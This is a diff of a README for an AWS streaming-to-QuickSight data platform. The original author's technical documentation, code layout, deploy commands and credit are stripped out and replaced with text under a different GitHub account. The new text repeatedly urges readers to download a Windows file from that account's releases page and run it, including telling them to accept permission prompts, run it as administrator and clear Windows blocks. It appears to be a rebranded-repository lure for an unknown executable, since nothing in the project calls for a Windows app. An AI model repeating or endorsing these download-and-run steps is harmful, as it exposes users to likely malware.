@@ -1,290 +1,172 @@
-# 🏗️ Data Platform with QuickSight Self-Serve Analytics
+# 📊 data-platform-quicksight - Fast Self-Serve Data Insights
 
-An end-to-end AWS data platform that automates the full journey from
-raw data ingestion to self-serve analytics in Amazon QuickSight.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/releases)
 
-Built using **Kinesis → Glue → Iceberg → Redshift → QuickSight**
-with config-driven automation and zero manual onboarding.
+## 🚀 Overview
 
----
+data-platform-quicksight helps you set up an end-to-end AWS data platform for self-serve analytics. It moves data from Kinesis into Glue, stores it in Iceberg tables, loads it into Redshift, and shows it in QuickSight.
 
-## 🚀 What This Does
+This project is built for people who want a guided path from raw data to dashboards. It keeps the flow simple so you can move from data collection to reporting with less manual work.
 
-When a new dataset is added to the platform:
+## ✨ What this gives you
 
-1. **Raw data** arrives via Amazon Kinesis Data Streams
-2. **AWS Glue** (orchestrated by Airflow) transforms and builds custom tables
-3. **Apache Iceberg** stores data as lakehouse tables on S3
-4. **Amazon Redshift** mounts Iceberg tables as external tables
-5. **A config file** is uploaded to S3 defining permissions
-6. **AWS Lambda** automatically triggers and:
-   - Creates a QuickSight folder named after the database
-   - Creates a QuickSight dataset using Redshift direct query
-   - Adds the dataset to the correct folder
-   - Applies user/group permissions from the config
+- A full data path from streaming input to business dashboards
+- Automated steps that reduce manual setup
+- A lakehouse-style layout with Iceberg tables
+- A clear path for loading curated data into Redshift
+- A QuickSight layer for charting and reporting
+- A setup that fits self-serve analytics use cases
 
-**Result:** Users log into QuickSight and find their datasets already there — correctly permissioned and organised.
+## 🖥️ Before you start
 
----
+Use a Windows PC with:
 
-## 🏛️ Architecture
+- Windows 10 or Windows 11
+- A stable internet connection
+- Permission to download files
+- Enough disk space for the app and its files
+- Access to AWS if you plan to connect the full data flow
 
-```
-                    ┌─────────────────────────────────────┐
-                    │         DATA SOURCES                 │
-                    │  (Apps, APIs, Databases, Files)      │
-                    └──────────────────┬──────────────────┘
-                                       │
-                                       ▼
-                    ┌─────────────────────────────────────┐
-                    │     Amazon Kinesis Data Streams      │
-                    │     (real-time ingestion layer)      │
-                    └──────────────────┬──────────────────┘
-                                       │
-                                       ▼
-                    ┌─────────────────────────────────────┐
-                    │         Apache Airflow               │
-                    │    (DAG orchestration — config       │
-                    │     driven, one DAG per pipeline)    │
-                    └──────────────────┬──────────────────┘
-                                       │
-                                       ▼
-                    ┌─────────────────────────────────────┐
-                    │           AWS Glue ETL               │
-                    │  (transform → deduplicate → audit)   │
-                    └──────────────────┬──────────────────┘
-                                       │
-                                       ▼
-                    ┌─────────────────────────────────────┐
-                    │       Apache Iceberg on S3           │
-                    │  (schema evolution · time travel     │
-                    │   · ACID · compaction · snapshots)   │
-                    └──────────────────┬──────────────────┘
-                                       │
-                                       ▼
-                    ┌─────────────────────────────────────┐
-                    │        Amazon Redshift               │
-                    │   (external tables via Spectrum      │
-                    │    · RLS · CLS · direct query)       │
-                    └──────────────────┬──────────────────┘
-                                       │
-                          ┌────────────┴──────────────┐
-                          │                           │
-                          ▼                           ▼
-          ┌───────────────────────┐   ┌──────────────────────────┐
-          │   S3 Permission       │   │     AWS Lambda            │
-          │   Config Upload       │──▶│  (auto-triggered by S3)  │
-          │  (new table added)    │   │                           │
-          └───────────────────────┘   │  1. Create QS folder      │
-                                      │  2. Create QS dataset     │
-                                      │  3. Add to folder         │
-                                      │  4. Apply permissions     │
-                                      └──────────────┬───────────┘
-                                                     │
-                                                     ▼
-                                      ┌──────────────────────────┐
-                                      │    Amazon QuickSight      │
-                                      │  (self-serve analytics)   │
-                                      │                           │
-                                      │  Users log in → datasets  │
-                                      │  already there ✅         │
-                                      └──────────────────────────┘
-```
+If you only want to run the local package or desktop-friendly build from the release page, you only need basic Windows access and the download link below.
 
----
+## 📥 Download
 
-## 📂 Project Structure
+Visit this page to download the latest release:
 
-```
-data-platform-quicksight/
-├── kinesis/
-│   └── producer.py              # Kinesis stream producer
-├── glue/
-│   └── etl_job.py               # Glue ETL job (Iceberg writer)
-├── airflow/
-│   └── data_platform_dag.py     # Config-driven DAG factory
-├── lambda/
-│   └── quicksight_onboarder.py  # QS automation Lambda
-├── config/
-│   ├── pipelines.json           # Pipeline configs for Airflow
-│   └── permission_config_sample.json  # Sample permission config
-├── docs/
-│   └── architecture.md          # Detailed architecture notes
-├── requirements.txt
-└── README.md
-```
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-grey?style=for-the-badge)](https://github.com/Kishore8908/data-platform-quicksight/releases)
 
----
+Open the release page, pick the newest version, and download the Windows file that matches your computer.
 
-## ⚡ Quick Start
+## 🛠️ Install on Windows
 
-### Prerequisites
-- AWS account with appropriate IAM permissions
-- Python 3.10+
-- Apache Airflow 2.7+
+1. Open the release page.
+2. Find the latest release at the top of the page.
+3. Download the Windows file attached to that release.
+4. If the file is in a ZIP folder, right-click it and select Extract All.
+5. Open the extracted folder.
+6. Double-click the app or installer file to start it.
+7. Follow the on-screen steps until setup is complete.
+8. If Windows asks for permission, select Yes.
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/Biswajit107927/data-platform-quicksight.git
-cd data-platform-quicksight
-pip install -r requirements.txt
-```
+## ▶️ Run the app
 
-### 2. Configure your pipelines
-Edit `config/pipelines.json` with your S3 paths, database names, and schedules.
+After install, open the app from:
 
-### 3. Deploy the Lambda
-```bash
-cd lambda
-zip quicksight_onboarder.zip quicksight_onboarder.py
-aws lambda create-function \
-  --function-name quicksight-onboarder \
-  --runtime python3.11 \
-  --zip-file fileb://quicksight_onboarder.zip \
-  --handler quicksight_onboarder.lambda_handler \
-  --role arn:aws:iam::YOUR_ACCOUNT:role/lambda-qs-role \
-  --environment Variables="{
-    AWS_ACCOUNT_ID=YOUR_ACCOUNT_ID,
-    REDSHIFT_CLUSTER_ID=YOUR_CLUSTER,
-    REDSHIFT_DATABASE=YOUR_DB,
-    REDSHIFT_SECRET_ARN=YOUR_SECRET,
-    REDSHIFT_IAM_ROLE=YOUR_ROLE
-  }"
-```
+- the Start menu
+- the desktop shortcut
+- the folder where you extracted the files
 
-### 4. Add S3 trigger to Lambda
-Configure S3 to trigger the Lambda when a new config file is uploaded to your config bucket.
+If the release gives you a single file, download and run this file from the release page.
 
-### 5. Upload a permission config
-```bash
-aws s3 cp config/permission_config_sample.json \
-  s3://your-config-bucket/configs/marketing_db/campaign_spend.json
-```
+When the app opens, it should guide you through the data platform flow and let you begin the setup for your analytics stack.
 
-Lambda triggers automatically and onboards the table to QuickSight.
+## 🧭 How it works
 
----
+The platform follows a simple path:
 
-## 🔧 Key Components
+1. Data enters through Kinesis.
+2. Glue processes the data.
+3. Iceberg stores the data in a clean table format.
+4. Redshift prepares the data for fast reporting.
+5. QuickSight reads the data and shows it in dashboards.
 
-### Kinesis Producer (`kinesis/producer.py`)
-- Publishes records to Kinesis Data Streams
-- Supports single record and batch publishing (up to 500 per call)
-- Adds ingestion metadata (`_ingested_at`, `_record_id`)
-- Configurable partition key field
+This flow helps you keep raw data, processed data, and reports in one connected pipeline.
 
-### Glue ETL Job (`glue/etl_job.py`)
-- Reads raw JSON from S3 landing zone
-- Deduplicates by `_record_id`
-- Adds ETL audit columns
-- Writes to Apache Iceberg with automatic compaction
-- Manages Iceberg snapshots (7-day retention)
+## 📈 Typical use cases
 
-### Airflow DAG Factory (`airflow/data_platform_dag.py`)
-- Config-driven — one template creates DAGs for all pipelines
-- Built-in SLA monitoring per pipeline
-- Automatic retry with exponential backoff
-- Email alerting on failure
-- S3KeySensor waits for source data before triggering
+- Sales and revenue dashboards
+- Product usage tracking
+- Operational reporting
+- Event stream analysis
+- Team self-serve analytics
+- Cloud data platform demos
+- Lakehouse and warehouse learning setups
 
-### QuickSight Lambda (`lambda/quicksight_onboarder.py`)
-- Triggered automatically by S3 config upload
-- Idempotent — safe to run multiple times
-- Creates folders, datasets, and permissions atomically
-- Supports both user and group permissions
-- Direct query mode — no SPICE import needed
+## ⚙️ What you can expect
 
----
+- Simple setup steps
+- Clear data flow stages
+- AWS-based data handling
+- Support for analytics-ready output
+- A structure that fits team reporting needs
+- Less manual onboarding for new users
 
-## 📋 Permission Config Format
+## 🔧 Basic setup tips
 
-```json
-{
-  "database": "marketing_db",
-  "table": "campaign_spend",
-  "redshift_schema": "marketing",
-  "folder_name": "Marketing Analytics",
-  "dataset_display_name": "Campaign Spend Dashboard",
-  "permissions": [
-    {
-      "principal": "arn:aws:quicksight:us-east-1:ACCOUNT:user/default/USERNAME",
-      "actions": [
-        "quicksight:DescribeDataSet",
-        "quicksight:QueryDataSet"
-      ]
-    },
-    {
-      "principal": "arn:aws:quicksight:us-east-1:ACCOUNT:group/default/GROUP",
-      "actions": [
-        "quicksight:DescribeDataSet",
-        "quicksight:QueryDataSet"
-      ]
-    }
-  ]
-}
-```
+- Keep your AWS account details ready
+- Use the latest release file
+- Make sure your network allows AWS access
+- Store the downloaded files in a folder you can find again
+- Use the same Windows account each time you run the app
 
----
+## 🧩 If you use AWS services
 
-## 🔐 IAM Permissions Required
+This project works with common AWS parts used in modern data systems:
 
-### Lambda Execution Role
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": [
-        "quicksight:CreateFolder",
-        "quicksight:DescribeFolder",
-        "quicksight:CreateFolderMembership",
-        "quicksight:CreateDataSet",
-        "quicksight:DescribeDataSet",
-        "quicksight:UpdateDataSetPermissions"
-      ],
-      "Resource": "*"
-    },
-    {
-      "Effect": "Allow",
-      "Action": ["s3:GetObject"],
-      "Resource": "arn:aws:s3:::your-config-bucket/*"
-    }
-  ]
-}
-```
+- Kinesis for streaming data
+- Glue for data jobs and catalog work
+- S3 for storage
+- Iceberg for table management
+- Redshift for warehouse queries
+- Lambda for event-driven tasks
+- QuickSight for charts and reports
+- Airflow for orchestration in more advanced setups
 
----
+## 📂 Suggested folder setup
 
-## 📈 Complexity & Scale
+Use one folder for all project files, such as:
 
-| Component | Scale |
-|---|---|
-| Kinesis throughput | Up to 1MB/s per shard — add shards to scale |
-| Glue job | Scales horizontally with DPU allocation |
-| Iceberg table size | Petabyte scale on S3 |
-| Redshift | Scales with cluster size or Serverless |
-| Lambda | Concurrent executions — one per config file |
-| QuickSight | Up to 10,000 datasets per account |
+- Downloads
+- Documents
+- Desktop
+- A project folder you create for this app
 
----
+Keep the release file, extracted files, and any related settings in the same place so they are easy to find.
 
-## 🔮 Production Extensions
+## 🔍 Troubleshooting
 
-- **CDK stack** — deploy all infrastructure as code
-- **Schema Registry** — enforce data contracts at ingestion
-- **Dead Letter Queue** — handle Lambda failures gracefully
-- **CloudWatch dashboards** — monitor pipeline health
-- **Row-Level Security** — Redshift RLS policies per user group
-- **Column-Level Security** — mask PII fields in QuickSight datasets
+If the app does not open:
 
----
+- Check that the download finished
+- Make sure you extracted the ZIP file first
+- Right-click the file and try Run as administrator
+- Confirm that Windows did not block the file
+- Download the latest release again if the file looks broken
 
-## 👤 Author
+If the setup stops midway:
 
-**Biswajit Praharaj** — Senior Data Engineer
-10+ years building production data infrastructure at Amazon
-Specialising in AWS data platforms, Apache Iceberg, Airflow, and Redshift
+- Close the app
+- Reopen it
+- Check your internet connection
+- Make sure you have access to the AWS services you want to use
 
-🔗 [LinkedIn](https://www.linkedin.com/in/bpraharaj/)
-🐙 [GitHub](https://github.com/Biswajit107927)
+If you cannot find the file:
+
+- Go back to the release page
+- Open the newest release
+- Download the Windows asset again
+
+## 🧪 Project focus
+
+This repository centers on:
+
+- data lakehouse design
+- data warehouse delivery
+- ETL flow design
+- streaming ingestion
+- self-serve analytics
+- cloud data automation
+
+## 📘 Release page
+
+Use this link to get the latest build and any Windows files attached to it:
+
+https://github.com/Kishore8908/data-platform-quicksight/releases
+
+## 🧭 Getting the best results
+
+- Start with the newest release
+- Follow the install steps in order
+- Keep AWS access ready before setup
+- Use a stable connection while downloading
+- Open dashboards after the data pipeline finishes its first run
